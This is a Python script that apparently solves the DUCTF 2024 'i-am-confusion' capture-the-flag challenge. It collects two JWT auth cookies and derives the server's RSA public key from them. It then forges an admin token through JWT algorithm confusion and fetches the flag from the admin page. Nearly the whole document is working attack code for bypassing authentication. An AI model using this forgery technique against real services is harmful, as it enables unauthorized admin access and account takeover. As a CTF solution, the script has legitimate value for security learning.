#! /usr/bin/env python3
import jwt
import jwt_forgery
import requests
import random
import base64
import re

#Stealing Cookies to derive public key
def steal_cookies() -> (str,str):
    #Post requests only allowed by this route
    url = "https://i-am-confusion.2024.ductf.dev:30001/login"
    data1 = {"username":str(random.random()),"password":"zzz"}
    data2 = {"username":str(random.random()),"password":"xxx"}
    req = requests.Session()
    req2 = requests.Session()
    cookies1 = req.post(url,data=data1)
    cookies2 = req2.post(url,data=data2)
    print("[+] Cookies generated")
    return (req.cookies.get_dict()["auth"],req2.cookies.get_dict()["auth"])

#Generating public keys
def generate_keys(cookie1: str,cookie2: str) -> list:
    print("[+]Generating public keys")
    public_keys: list = jwt_forgery.jwt_Forgery(cookie1,cookie2)
    return public_keys

#Generating cookies with pyjwt
def generate_cookies(jwt,public_key: str) -> str:
    payload_username = "admin"
    cookie = jwt_forgery.forge_mac(jwt,public_key,payload_username)
    print(f"[+]Cookie: {cookie}")
    return cookie

#finding flag and testing cookie
def find_flag(cookie: str) -> str or None:
    url = "https://i-am-confusion.2024.ductf.dev:30001/admin.html"
    cookies = f"auth={cookie}"
    headers = {"Cookie": cookies}
    req = requests.get(url,headers=headers).text
    if "DUCTF{" in req:
        return req
    else:
        return None
#Regular expression for flag
def grep_flag(result: str) -> str:
    result = re.findall(r"[A-Z]+\{[a-zA-Z_0-9!@#$%^&*()-=+|\;:\".,<>?/]*\}",result)
    return result[0]
def main():
    cookies1, cookies2 = steal_cookies()
    public_keys = generate_keys(cookies1,cookies2)
    flag_result = ""
    for key in public_keys:
        print(f"[+] Testing public key: {key}")
        cookie = generate_cookies(cookies1,base64.b64decode(key))
        result = find_flag(cookie)
        if result == None:
           print("[+] Incorrect key")
        else:
            flag_result = result
            break
    print(f"[+]Flag is {grep_flag(flag_result)}")
    
if __name__ == "__main__":
   try:
      main()
   except KeyboardInterrupt:
          print("Exiting")
